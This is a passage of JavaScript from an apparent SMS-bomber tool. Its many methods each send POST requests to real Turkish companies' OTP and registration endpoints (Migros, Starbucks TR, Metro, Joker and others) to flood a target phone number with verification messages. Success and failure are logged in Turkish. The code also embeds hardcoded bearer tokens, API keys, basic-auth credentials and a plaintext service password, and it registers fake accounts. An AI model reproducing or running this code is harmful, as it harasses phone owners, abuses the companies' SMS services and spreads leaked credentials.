name="call_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
    
            if (response.status === 202) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> koton.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> koton.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> koton.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async hizliEcza() {
        try {
            const url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP";
            const headers = {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "Bearer null"
            };
            const json = { "otpOperationType": 2, "phoneNumber": `+90${this.phone}` };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.isSuccess === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> hizlieczaprodapi.hizliecza.net`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> hizlieczaprodapi.hizliecza.net`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> hizlieczaprodapi.hizliecza.net`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async metro() {
        try {
            const url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip, deflate",
                "Applicationversion": "2.1.1",
                "Applicationplatform": "2",
                "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
                "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
                "Connection": "close"
            };
            const json = { "methodType": "2", "mobilePhoneNumber": `+90${this.phone}` };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.status === "success") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> feature.metro-tr.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> feature.metro-tr.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> feature.metro-tr.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async qumpara() {
        try {
            const url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP";
            const headers = {
                "Content-Type": "application/json",
                "Content-Length": "29",
                "Host": "tr-api.fisicek.com"
            };
            const json = { "msisdn": `+90${this.phone}` };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> tr-api.fisicek.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> tr-api.fisicek.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> tr-api.fisicek.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async ipragaz() {
        try {
            const url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp";
            const headers = {
                "Content-Type": "application/json",
                "X-Api-Token": "",
                "Authorization": "",
                "App-Version": "1.3.9",
                "App-Lang": "en",
                "Accept": "*/*",
                "App-Name": "ipragaz-mobile",
                "Os": "ios",
                "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4",
                "App-Build": "41",
                "Os-Version": "15.7.7",
                "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8",
                "Connection": "close"
            };

            const json = {
                "birthDate": "18/12/1999",
                "carPlate": "29 ZEY 18",
                "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63",
                "name": "Whisky Lorean",
                "otp": "",
                "phoneNumber": this.phone,
                "playerId": ""
            };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> ipapp.ipragaz.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> ipapp.ipragaz.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> ipapp.ipragaz.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async migros() {
        try {
            const url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp";
            const headers = {
                "User-Agent": "Migros/1917 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                "X-Device-Model": "iPhone 31 Plus",
                "X-Device-Type": "MOBILE",
                "X-Device-App-Screen": "OTHER",
                "X-Device-Language": "tr-TR",
                "X-Device-App-Version": "10.6.13",
                "X-Device-Current-Long": "",
                "X-Request-Identifier": "FBE85947-6E31-49AC-AC8C-317B21D79E80",
                "X-Device-Selected-Address-Lat": "",
                "X-Device-Platform-Version": "15.8.0",
                "X-Device-Current-Lat": "",
                "X-Device-Platform": "IOS",
                "X-Store-Ids": "",
                "X-Device-Longitude": "",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Accept": "*/*",
                "Content-Type": "application/json",
                "X-Device-Latitude": "",
                "Accept-Encoding": "gzip, deflate, br",
                "X-Device-Selected-Address-Long": "",
                "X-Device-Identifier": "31CAAD3F-5B53-315B-9C6D-31310D86826C"
            };

            const json = { email: this.mail, phoneNumber: this.phone };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            const data = await response.json();

            if (data.successful === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> rest.migros.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> rest.migros.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> rest.migros.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async paybol() {
        try {
            const url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms";
            const headers = {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0",
                "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close"
            };

            const json = { "phone_number": `90${this.phone}` };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.status === 0) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> pyb-mobileapi.walletgate.io`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> pyb-mobileapi.walletgate.io`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> pyb-mobileapi.walletgate.io`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async fileMarket() {
        try {
            const url = "https://api.filemarket.com.tr:443/v1/otp/send";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Os": "IOS",
                "X-Version": "1.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate"
            };

            const json = { "mobilePhoneNumber": `90${this.phone}` };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.responseType === "SUCCESS") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.filemarket.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.filemarket.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.filemarket.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async joker() {
        try {
            const url = "https://api.joker.com.tr:443/api/register";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3",
                "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
                "Connection": "close"
            };

            const json = {
                "firstName": "Merdo",
                "gender": "m",
                "iosVersion": "4.0.2",
                "lastName": "Lorean",
                "os": "IOS",
                "password": "29ZEY..zey18",
                "phoneNumber": `0${this.phone}`,
                "username": this.mail
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.message === "Doğrulama kodu gönderildi.") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.joker.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.joker.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.joker.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async akasya() {
        try {
            const url = "https://akasya-admin.poilabs.com:443/v1/tr/sms";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5",
                "User-Agent": "Akasya",
                "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
                "Accept-Encoding": "gzip, deflate, br"
            };

            const json = { "phone": this.phone };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.result === "SMS sended succesfully!") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> akasya-admin.poilabs.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> akasya-admin.poilabs.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> akasya-admin.poilabs.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async akbati() {
        try {
            const url = "https://akbati-admin.poilabs.com:443/v1/tr/sms";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3",
                "User-Agent": "Akbat",
                "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
                "Accept-Encoding": "gzip, deflate, br"
            };

            const json = { "phone": this.phone };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.result === "SMS sended succesfully!") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> akbati-admin.poilabs.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> akbati-admin.poilabs.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> akbati-admin.poilabs.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async clickMe() {
        try {
            const url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code";
            const headers = {
                "Content-Type": "application/json",
                "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
                "Client-Version": "1.4.0",
                "Client-Device": "IOS",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
            };

            const json = { phone: this.phone };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.isSuccess === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> mobile-gateway.clickmelive.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> mobile-gateway.clickmelive.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> mobile-gateway.clickmelive.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async happy() {
        try {
            const url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone";
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Origin": "https://www.happy.com.tr",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
                "Referer": "https://www.happy.com.tr/index.php?route=account/register"
            };

            const data = new URLSearchParams();

            data.append("telephone", this.phone);
    
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
    
            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> happy.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> happy.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> happy.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async komagene() {
        try {
            const url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder";
            const json = { Telefon: this.phone, FirmaId: "32" };
            const headers = {
                "Content-Type": "application/json",
                "Content-Length": "44",
                "Host": "gateway.komagene.com.tr"
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.Success === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> gateway.komagene.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> gateway.komagene.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> gateway.komagene.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async kuryemGelsin() {
        try {
            const url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage";
            const json = { phoneNumber: this.phone, phone_country_code: "+90" };
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(json)
            });
    
            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.kuryemgelsin.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.kuryemgelsin.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.kuryemgelsin.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async porty() {
        try {
            const url = "https://panel.porty.tech:443/api.php?";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
            };
            const json = { "job": "start_login", "phone": this.phone };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.status === "success") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> panel.porty.tech`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> panel.porty.tech`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> panel.porty.tech`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async taksim() {
        try {
            const url = "https://service.taksim.digital:443/services/PassengerRegister/Register";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="
            };
            const json = {
                "countryPhoneCode": "+90",
                "name": "Whisky",
                "phoneNo": this.phone,
                "surname": "Lorean"
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.success === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> service.taksim.digital`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> service.taksim.digital`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> service.taksim.digital`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async tasdelen() {
        try {
            const url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend";
            const json = { PhoneNumber: this.phone, user: { Password: "Aa123!35@1", UserName: "MobilOperator" } };
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.Result === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> 94.102.66.162:80`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> 94.102.66.162:80`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> 94.102.66.162:80`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async tasimacim() {
        try {
            const url = "https://server.tasimacim.com/requestcode";
            const json = { phone: this.phone, lang: "tr" };
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(json)
            });

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> server.tasimacim.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> server.tasimacim.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> server.tasimacim.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async uysal() {
        try {
            const url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "User-Agent": "UM Uysal Online Market/1.0.15 (team.clevel.uysalmarket; build:1; iOS 15.8.0) Alamofire/5.4.1",
                "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
                "Connection": "close"
            };
            const json = { "phone_number": this.phone };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.uysalmarket.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.uysalmarket.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.uysalmarket.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async yapp() {
        try {
            const url = "https://yapp.com.tr:443/api/mobile/v1/register";
            const json = {
                app_version: "1.1.2",
                code: "tr",
                device_model: "iPhone9,4",
                device_name: "",
                device_type: "I",
                device_version: "15.7.8",
                email: this.mail,
                firstname: "Whisky",
                is_allow_to_communication: "1",
                language_id: "1",
                lastname: "Lorean",
                phone_number: this.phone,
                sms_code: ""
            };

            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(json)
            });

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> yapp.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> yapp.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> yapp.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async yilmazTicaret() {
        try {
            const url = "http://www.yilmazticaret.net:80/restapi2/register/";
            const headers = {
                "Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="
            };
            const data = new FormData();
            data.append("telefon", `0 ${this.phone}`);
            data.append("token", "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]");
    
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
    
            const jsonResponse = await response.json();

            if (jsonResponse.giris === "success") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> yilmazticaret.net`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> yilmazticaret.net`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> yilmazticaret.net`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async yuffi() {
        try {
            const url = "https://api.yuffi.co/api/parent/login/user";
            const json = { phone: this.phone, kvkk: true };
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.success === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.yuffi.co`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.yuffi.co`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.yuffi.co`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async starbucks() {
        try {
            const url = "https://auth.sbuxtr.com:443/signUp";
            const headers = {
                "Content-Type": "application/json",
                "Operationchannel": "ios",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br"
            };
            const json = {
                "allowEmail": true,
                "allowSms": true,
                "deviceId": "31",
                "email": this.mail,
                "firstName": "Whisky",
                "lastName": "Lorean",
                "password": "29ZEY..zey18",
                "phoneNumber": this.phone,
                "preferredName": "Whisky"
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.code === 50) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> auth.sbuxtr.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> auth.sbuxtr.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> auth.sbuxtr.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async pidem() {
        try {
            const url = "https://restashop.azurewebsites.net:443/graphql/";
            const headers = {
                "Accept": "*/*",
                "Origin": "https://pidem.azurewebsites.net",
                "Content-Type": "application/json",
                "Authorization": "Bearer null",
                "Referer": "https://pidem.azurewebsites.net/",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
                "Accept-Encoding": "gzip, deflate, br"
            };

            const json = {
                "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n",
                "variables": { "phone": this.phone }
            };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.data.sendOtpSms.resultStatus === "SUCCESS") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> restashop.azurewebsites.net`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> restashop.azurewebsites.net`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> restashop.azurewebsites.net`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async baydoner() {
        try {
            const url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp";
            const headers = {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Platform": "1",
                "Accept-Encoding": "gzip, deflate, br",
                "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"
            };

            const json = {
                "AppVersion": "1.3.2",
                "AreaCode": 90,
                "City": "ADANA",
                "CityId": 1,
                "Code": "",
                "Culture": "tr-TR",
                "DeviceId": "31s",
                "DeviceModel": "31",
                "DeviceToken": "3w1",
                "Email": this.mail,
                "GDPRPolicy": false,
                "Gender": "Erkek",
                "GenderId": 1,
                "LoyaltyProgram": false,
                "merchantID": 5701,
                "Method": "",
                "Name": "Whisky",
                "notificationCode": "31",
                "NotificationToken": "31",
                "OsSystem": "IOS",
                "Password": "29Zeyzey18",
                "PhoneNumber": this.phone,
                "Platform": 1,
                "sessionID": "31",
                "socialId": "",
                "SocialMethod": "",
                "Surname": "Lorean",
                "TempId": 942603,
                "TermsAndConditions": false
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.Control === 1) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> crmmobil.baydoner.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> crmmobil.baydoner.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> crmmobil.baydoner.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async frink() {
        try {
            const url = "https://api.frink.com.tr:443/api/auth/postSendOTP";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Authorization": "",
                "Accept-Encoding": "gzip, deflate, br",
                "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1",
                "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
                "Connection": "close"
            };
            const json = {
                "areaCode": "90",
                "etkContract": true,
                "language": "TR",
                "phoneNumber": "90" + this.phone
            };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.processStatus === "SUCCESS") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.frink.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.frink.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.frink.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async bodrum() {
        try {
            const url = "https://gandalf.orwi.app:443/api/user/requestOtp";
            const headers = {
                "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"
            };
